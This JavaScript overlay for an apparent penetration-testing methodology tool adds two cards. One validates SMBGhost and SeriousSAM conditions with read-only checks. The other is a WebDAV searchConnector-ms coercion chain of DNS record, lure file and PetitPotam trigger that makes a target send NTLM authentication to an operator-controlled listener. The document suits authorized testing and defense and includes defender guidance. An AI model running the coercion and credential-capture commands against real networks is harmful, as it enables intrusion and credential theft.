// Obol v7.9 methodology overlay — deliver the remaining frozen low_access.md partial parents.
(function(root){
'use strict';
const lanes=root.OBOL_LANES||[],O=root.OBOL_ORANGE_AD_2025_03,M45=root.OBOL_METHODOLOGY_V45,M47=root.OBOL_METHODOLOGY_V47,M78=root.OBOL_METHODOLOGY_V78,F=root.OBOL_ORANGE_FIDELITY_V64,F79=root.OBOL_ORANGE_FIDELITY_V79;
if(!O||!M45||!M47||!M78||!F||!F79)throw new Error('Obol Orange plus v4.5/v4.7/v7.8 methodology and v7.9 fidelity layers are required before methodology-v7.9.js');
function lane(id){return lanes.find(x=>x.lane===id);}function card(id){for(const l of lanes)for(const c of l.cards||[])if(c.id===id)return c;return null;}function addCard(laneId,c){const l=lane(laneId);if(!l)throw new Error('Missing lane '+laneId);const old=card(c.id);if(old)return old;c.lane=laneId;l.cards.push(c);return c;}
const surf=s=>({operatorSurface40:s,operatorSurface79Source:'audited-v7.9'}),stage={stage:'privilege',order:45,label:'Validate local privilege paths',summary:'Validate the smallest proof boundary first. A vulnerable condition or coercion trigger is not execution, inbound authentication, relay success, administrator access, SYSTEM, or domain compromise.',canonicalKeys:[]};
function section(key){for(const f of O.files||[])for(const s of f.sections||[])if(s.key===key)return s;return null;}
function attach(c,p){c.evidence45={...p};M45.profiles[c.id]={...p};if(!M45.profileCardIds.includes(c.id))M45.profileCardIds.push(c.id);const r=M47.reportContract(c);if(r){c.report47={...r,evidenceProfile:true,evidenceFamily:p.family,evidenceSource:'v7.9',claims:[...(p.claims||[])]};const old=(M47.contracts||[]).find(x=>x.cardId===c.id);if(old)Object.assign(old,c.report47);else{M47.contracts=M47.contracts||[];M47.contracts.push({...c.report47});}}}
function provenance(c,key){const s=section(key);c.orange43=c.orange43||[];if(!c.orange43.some(x=>x.key===key))c.orange43.push({key,file:'low_access.md',label:(s&&s.label)||key,status:(s&&s.status)||'implemented',advancedIn:(s&&s.advancedIn)||''});c.orange44=c.orange44||{...stage,canonicalKeys:[]};c.orange44.canonicalKeys=c.orange44.canonicalKeys||[];if(!c.orange44.canonicalKeys.includes(key))c.orange44.canonicalKeys.push(key);}
const REF=O.upstream.sourceBase+'low_access.md';
const local=addCard('ad',{id:'windows-local-exploit-79',title:'Windows Local Exploit Validation',hypothesis:'A Windows build or named CVE is context, not proof. Validate the exact SMBGhost or SeriousSAM precondition with read-only checks first, preserve explicit vulnerability/ACL/shadow-copy Evidence, and keep exploit execution and resulting privilege as separate follow-on boundaries.',prereq:{any:['os.windows','foothold.windows','access.user']},produces:['os.windows'],executionContext79:{kali:'Use Nmap or Metasploit check mode against the reviewed Windows target. Do not treat module availability or OS version alone as exploitability.',windows:'Use built-in PowerShell, icacls, and vssadmin to preserve build, ACL, and shadow-copy context without creating new sensitive copies.'},commands:[
 {tool:'powershell',run:'Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber',note:'Capture the exact local Windows build before evaluating a named vulnerability. Version context alone is not a positive vulnerability result.',...surf('windows')},
 {tool:'nmap',run:'nmap -Pn -p445 --script smb-protocols,smb2-capabilities {{target}}',note:'Review SMB protocol/capability context before the SMBGhost branch. Capability output is context, not CVE confirmation.',...surf('kali')},
 {tool:'msfconsole',run:'msfconsole -q -x "use exploit/windows/smb/cve_2020_0796_smbghost; set RHOSTS {{target}}; check; exit"',note:'Bounded SMBGhost check only. Require the module to explicitly report a vulnerable condition before considering an exploit attempt.',...surf('kali')},
 {tool:'cmd',run:'icacls C:\\Windows\\System32\\config\\SAM',note:'SeriousSAM/HiveNightmare precondition check. Preserve the returned ACL; permissive read rights are a vulnerability condition, not credential extraction.',...surf('windows')},
 {tool:'cmd',run:'vssadmin list shadows',note:'List existing shadow copies without creating one. A shadow-copy inventory does not itself prove readable SAM/SYSTEM material.',...surf('windows')}
],expected:['OsBuildNumber','VULNERABLE','BUILTIN\\Users:(I)(RX)','Shadow Copy Volume'],onFailure:{'The target is not exploitable':{note:'Preserve the negative check and continue local enumeration rather than forcing the named CVE path.'},'No items found that satisfy the query':{note:'No usable shadow copy was observed. Do not create one solely to manufacture the condition.'}},defender:'Patch SMBGhost and SeriousSAM-era systems, restrict access to registry hives and shadow copies, and monitor unusual local ACL/shadow-copy discovery on endpoints.',report:{finding:'Windows Local Privilege Escalation Condition',severity:'high'},tools:['PowerShell','Nmap','Metasploit','icacls','vssadmin'],os:['windows'],refs:[REF]});local.orange44={...stage,canonicalKeys:[]};
const webdav=addCard('ad',{id:'webdav-coercion-79',title:'WebDAV searchConnector-ms Coercion',hypothesis:'The pinned WebDAV branch is a coercion chain, not an automatic relay win. Prepare a controlled DNS name and lure, trigger only the reviewed target, and require separately captured inbound authentication before any relay/access claim. Remove temporary DNS and lure artifacts afterward.',prereq:{any:['credential.available','access.user','ad.domain_known']},produces:['credential.candidate'],executionContext79:{kali:'Prepare the controlled DNS name and run the reviewed coercion/listener path from Kali. Inbound NetNTLM material is the first meaningful proof boundary.',windows:'The target-side action is opening the reviewed searchConnector-ms lure. File open, inbound authentication, relay, access, execution, and privilege remain separate.'},commands:[
 {tool:'dnstool',run:"python3 dnstool.py -u '{{domain}}\\{{user}}' -p '{{password}}' --record '{{listener_name}}' --action add --data {{lhost}} {{dc}}",note:'Create the temporary DNS record used by the reviewed WebDAV listener name. DNS creation is preparation only.',...surf('kali')},
 {tool:'powershell',run:"Set-Content -Path '{{file}}.searchConnector-ms' -Value '<?xml version=\"1.0\" encoding=\"UTF-8\"?><searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\"><description>Authorized WebDAV validation</description><isSearchOnlyItem>false</isSearchOnlyItem><includeInStartMenuScope>true</includeInStartMenuScope><templateInfo><folderType>{8FAF9629-1980-46FF-8023-9DCEAB9C3EE3}</folderType></templateInfo><simpleLocation><url>http://{{listener_name}}@80/</url></simpleLocation></searchConnectorDescription>'",note:'Build the reviewed searchConnector-ms lure. Creating the file does not prove that a target opened it or authenticated.',...surf('windows')},
 {tool:'petitpotam',run:"python3 petitpotam.py -u '{{user}}' -p '{{password}}' -d '{{domain}}' '{{listener_name}}@80/random.txt' {{target}}",note:'Trigger the reviewed coercion path. A successful RPC call is only a coercion trigger; require separate listener output for inbound authentication.',...surf('kali')},
 {tool:'dnstool',run:"python3 dnstool.py -u '{{domain}}\\{{user}}' -p '{{password}}' --record '{{listener_name}}' --action remove {{dc}}",note:'Cleanup the temporary DNS record after preserving Evidence. Remove the lure file as well when it was created solely for this validation.',...surf('kali')}
],expected:['record added','NTLMv2-SSP Hash','::','authentication'],onFailure:{'rpc_s_access_denied':{note:'The current identity could not trigger the reviewed coercion interface. Preserve the denial without inferring that WebDAV itself is unavailable.'},'No credentials were captured':{note:'A trigger without inbound authentication is not success. Re-check listener name resolution, WebClient state, target context, and scope.'}},defender:'Restrict WebClient where unnecessary, harden NTLM, require signing/channel binding where applicable, monitor unusual searchConnector-ms delivery, and alert on unexpected WebDAV authentication to operator-controlled names.',report:{finding:'WebDAV Coercion Exposes Inbound Authentication',severity:'high'},tools:['dnstool.py','PetitPotam','WebDAV'],os:['windows'],refs:[REF]});webdav.orange44={...stage,canonicalKeys:[]};
const profiles={
 'windows-local-exploit-79':{family:'windows-local-exploit',source:'v7.9',proof:'explicit build/capability plus explicit vulnerability, ACL, or shadow-copy condition; execution and privilege remain separate follow-on proof states',claims:['os.windows']},
 'webdav-coercion-79':{family:'webdav-coercion',source:'v7.9',proof:'explicit inbound authentication material after the reviewed DNS/lure/coercion preparation; DNS changes and coercion triggers alone are not credential, relay, access, execution, or privilege proof',claims:['credential.candidate']}
};for(const c of [local,webdav])attach(c,profiles[c.id]);
function unitIds(key){return (F.units||[]).filter(x=>x.sourceFile==='low_access.md'&&x.canonicalKey===key&&x.auditedIn==='7.9').map(x=>x.id);}
function complete(ids){return ids.length>0&&ids.every(id=>{const u=(F.units||[]).find(x=>x.id===id);return u&&['modeled','superseded','rejected'].includes(u.auditStatus)&&(F.dimensions||[]).every(d=>u.review&&u.review[d.id]===true);});}
function advance(key,ids,note){const units=unitIds(key);if(!complete(units))throw new Error('v7.9 cannot reconcile '+key+' before its low-access source units are terminal and fidelity-complete');const s=section(key);if(!s)throw new Error('Missing canonical section '+key);if(s.status!=='partial')throw new Error('v7.9 expected frozen partial '+key+' but found '+s.status);s.status='implemented';s.cardIds=ids.slice();s.note=note;s.advancedIn='7.9';s.sourceDepthAudit62={status:'modeled',reason:note};for(const id of ids)provenance(card(id),key);}
advance('low_access.local-exploit',[local.id],'v7.9 decomposes SMBGhost and SeriousSAM into explicit validation paths that keep version/exposure, vulnerability condition, execution, credential extraction, and resulting privilege separate.');
advance('low_access.webdav',[webdav.id],'v7.9 models the pinned WebDAV/searchConnector-ms coercion chain with controlled DNS/lure preparation, explicit inbound-authentication proof, relay separation, and cleanup.');
for(const uid of F79.auditedIds||[]){const u=(F.units||[]).find(x=>x.id===uid);if(!u)throw new Error('Missing v7.9 source-fidelity unit '+uid);for(const owner of u.ownerCardIds||[]){const c=card(owner);if(!c)throw new Error('Missing v7.9 owner '+owner+' for '+uid);provenance(c,u.canonicalKey);c.atomic79=[...new Set([...(c.atomic79||[]),uid])];}}
O.coverageRevision='7.9';O.coverageOverlay='data/methodology-v7.9.js';
root.OBOL_METHODOLOGY_V79={version:'7.9.0',profiles,cardIds:[local.id,webdav.id],fidelityIds:F79.auditedIds.slice(),advancedKeys:['low_access.local-exploit','low_access.webdav'],completedBaselineKeys:['low_access.local-exploit','low_access.webdav'],statement:'v7.9 completes the two frozen low_access.md partial parents while intentionally leaving the file-level atomized denominator unchanged until the other low-access branches receive subordinate source inventory.'};
})(typeof window!=='undefined'?window:globalThis);
